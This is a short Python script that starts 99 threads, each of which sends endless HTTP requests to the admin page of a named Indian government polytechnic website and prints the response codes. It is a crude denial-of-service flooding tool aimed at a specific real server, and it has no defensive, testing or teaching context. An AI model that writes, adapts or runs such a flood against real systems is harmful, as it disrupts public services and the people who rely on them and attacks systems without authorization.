import requests as re
import threading


def func():
    while True:
        r = re.get("http://polytechnic.wbtetsd.gov.in/admin/")
        print(r.status_code)


threads = []
for i in range(1, 100):
    process = threading.Thread(target=func)
    process.start()
    threads.append(process)
for process in threads:
    process.join()
